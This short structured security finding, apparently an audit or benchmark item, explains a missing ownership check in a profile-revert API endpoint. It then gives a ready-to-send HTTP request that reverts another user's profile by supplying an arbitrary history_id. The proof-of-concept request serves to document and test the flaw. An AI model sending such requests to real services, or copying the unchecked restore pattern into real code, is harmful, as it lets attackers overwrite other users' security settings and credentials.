diagnosis: The endpoint restores a historical profile revision by calling historical_record.instance.save() on whatever record matches history_id. It fails to verify that the historical record belongs to request.user (e.g. historical_record.user_id == request.user.id). An attacker can revert another user's profile to a past state, overwriting security settings or resetting newly established authorization credentials.
exploit_request:
POST /api/user-profile/revert/ HTTP/1.1
Host: accounts.saas.com
Authorization: Bearer <attacker_token>
Content-Type: application/json

{"history_id": 9041}
